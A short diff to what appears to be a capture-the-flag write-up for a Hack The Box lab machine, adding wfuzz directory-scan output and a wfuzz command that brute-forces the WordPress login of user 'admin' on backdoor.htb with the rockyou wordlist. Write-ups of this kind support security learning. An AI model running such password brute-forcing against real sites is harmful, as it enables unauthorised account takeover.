@@ -39,3 +39,5 @@ ID           Response   Lines    Word       Chars       Payload
 000000765:   301        9 L      28 W       318 Ch      "wp-includes"
 000006941:   301        9 L      28 W       315 Ch      "wp-admin"
 ```
+Brute force wp-admin.php POST request:
+`wfuzz -w /usr/share/wordlists/rockyou. txt -d "log=admin&pwd=FUZZ" -u "http://backdoor.htb/wp-login.php" --hh=6081 -c`
